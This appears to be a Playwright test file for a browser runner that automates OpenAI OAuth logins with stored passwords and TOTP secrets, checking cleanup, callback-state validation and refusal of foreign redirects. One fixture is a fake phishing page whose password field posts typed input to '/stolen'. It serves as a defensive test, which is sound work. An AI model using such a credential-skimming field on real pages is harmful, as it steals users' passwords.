import { test } from 'node:test'
import assert from 'node:assert/strict'
import { createServer } from 'node:http'
import { chromium } from 'playwright'
import { authenticator } from 'otplib'
import { createBrowserRunner } from '../src/browser.mjs'

const secret = 'JBSWY3DPEHPK3PXP'
test('init-script failure closes the browser context', async () => {
  let closed = 0
  const browser = { newContext: async () => ({ close: async () => { closed++ }, addInitScript: async () => { throw new Error('fixture init failure') } }) }
  const upstream = async () => ({ authorizationUrl: 'https://auth.openai.com/oauth/authorize?state=x&redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fauth%2Fcallback' })
  await assert.rejects(createBrowserRunner({ browser, upstream })({ credentials: { email: 'fixture@example.com' }, signal: new AbortController().signal, update: () => {} }))
  assert.equal(closed, 1)
})
test('initialization failure or cancellation closes the context before login', async () => {
  let closed = 0
  let navigated = 0
  const abort = new AbortController()
  const upstream = async () => ({ authorizationUrl: 'https://auth.openai.com/oauth/authorize?state=x&redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fauth%2Fcallback' })
  for (const cancel of [false, true]) {
    const browser = { newContext: async () => {
      if (cancel) abort.abort()
      return { close: async () => { closed++ }, newPage: async () => { navigated++; throw new Error('fixture page failure') } }
    } }
    await assert.rejects(createBrowserRunner({ browser, upstream })({ credentials: { email: 'fixture@example.com' }, signal: abort.signal, update: () => {} }))
  }
  assert.equal(closed, 2)
  assert.equal(navigated, 1)
})
test('OAuth browser context uses the worker network instead of the account proxy', async () => {
  let options
  const browser = {
    newContext: async value => {
      options = value
      throw new Error('fixture context failure')
    },
  }
  const upstream = async () => ({ authorizationUrl: 'https://auth.openai.com/oauth/authorize?state=x&redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fauth%2Fcallback' })
  await assert.rejects(createBrowserRunner({ browser, upstream })({
    credentials: { email: 'fixture@example.com' },
    proxy: { server: 'http://proxy.invalid' },
    signal: new AbortController().signal,
    update: () => {},
  }))
  assert.equal(options.proxy, undefined)
})
test('real browser completes password + TOTP + consent, masks takeover, validates callback and cancels', async t => {
  let manual = false
  let wrongState = false
  let completeCount = 0
  let redirectForeign = false
  let foreignRequests = 0
  const foreign = createServer((_req, res) => {
    foreignRequests++
    res.setHeader('content-type', 'text/html')
    res.end('<input type="password" oninput="fetch(\'/stolen\', {method:\'POST\',body:this.value})"><button type="submit">Continue</button>')
  })
  await new Promise(resolve => foreign.listen(0, '127.0.0.1', resolve))
  t.after(() => new Promise(resolve => foreign.close(resolve)))
  const fields = (field, title, action) => `<h1>${title}</h1><form method="POST" action="${action}"><input ${field}><button type="submit">Continue</button></form>`
  const server = createServer(async (req, res) => {
    let body = ''
    for await (const part of req) body += part
    const params = new URLSearchParams(body)
    const url = new URL(req.url, 'http://fixture')
    const html = value => { res.setHeader('content-type', 'text/html'); res.end(value) }
    if (url.pathname === '/oauth/authorize') {
      if (redirectForeign) return res.writeHead(302, { location: `http://127.0.0.1:${foreign.address().port}/password` }).end()
      return html(fields('name="username" type="email"', 'Log in', '/password'))
    }
    if (url.pathname === '/password') {
      assert.equal(params.get('username'), 'fixture@example.com')
      return html(fields('name="password" type="password"', 'Password', '/totp'))
    }
    if (url.pathname === '/totp') {
      assert.equal(params.get('password'), 'fixture-password')
      return html(fields('name="totp" autocomplete="one-time-code"', 'Authenticator app', '/verified'))
    }
    if (url.pathname === '/verified') {
      assert.ok(authenticator.check(params.get('totp'), secret))
      if (manual) return html(fields('name="email_code" autofocus', 'Check your inbox', '/consent'))
    }
    if (url.pathname === '/verified' || url.pathname === '/consent') return html('<h1>Consent</h1><form method="POST" action="/callback"><button name="authorize">Allow</button></form>')
    if (url.pathname === '/callback') {
      res.writeHead(302, { location: `http://localhost:1455/auth/callback?code=fixture-code&state=${wrongState ? 'wrong' : 'fixture-state'}` })
      return res.end()
    }
    res.writeHead(404).end()
  })
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve))
  t.after(() => new Promise(resolve => server.close(resolve)))
  const origin = `http://127.0.0.1:${server.address().port}`
  const browser = await chromium.launch({ headless: true })
  t.after(() => browser.close())
  const stages = []
  let reauthorizing = false
  const upstream = async (path, cookie, body) => {
    assert.equal(cookie, 'fixture-cookie')
    if (path.endsWith('/start')) {
      assert.equal(body.accountId, reauthorizing ? 'fixture-account' : undefined)
      return { flowId: 'fixture-flow', authorizationUrl: `${origin}/oauth/authorize?state=fixture-state&redirect_uri=${encodeURIComponent('http://localhost:1455/auth/callback')}` }
    }
    assert.equal(body.flowId, 'fixture-flow')
    if (reauthorizing) assert.equal(Object.hasOwn(body, 'settings'), false)
    else assert.equal(body.settings.weight, 2)
    assert.equal(new URL(body.callbackUrl).searchParams.get('code'), 'fixture-code')
    completeCount++
    return { accountId: 'fixture-account' }
  }
  const run = createBrowserRunner({ browser, upstream, allowedOrigin: origin, timeoutMs: 15000 })
  const input = () => ({ credentials: { email: 'fixture@example.com', password: 'fixture-password', totpSecret: secret }, cookie: 'fixture-cookie', settings: { weight: 2 }, signal: new AbortController().signal, update: stage => { stages.push(stage) } })
  assert.equal((await run(input()).catch(error => { console.info('fixture stages:', stages); throw error })).accountId, 'fixture-account')
  assert.ok(stages.includes('totp'))
  reauthorizing = true
  assert.equal((await run({ ...input(), targetAccountId: 'fixture-account' })).accountId, 'fixture-account')
  reauthorizing = false
  manual = true
  await run({ ...input(), update: (stage, controls) => {
    if (stage === 'waiting') void (async () => {
      assert.ok((await controls.screen()).byteLength > 1000)
      await controls.input({ kind: 'text', text: '123456' })
      await controls.input({ kind: 'key', key: 'Enter' })
      await controls.input({ kind: 'resume' })
    })()
  } }).catch(error => { throw error })
  manual = false
  wrongState = true
  await assert.rejects(run(input()), /回调/)
  const abort = new AbortController()
  abort.abort()
  await assert.rejects(run({ ...input(), signal: abort.signal }))
  redirectForeign = true
  await assert.rejects(run(input()), /跳转/)
  assert.equal(foreignRequests, 0)
  assert.equal(completeCount, 3)
  assert.equal(browser.contexts().length, 0)
})
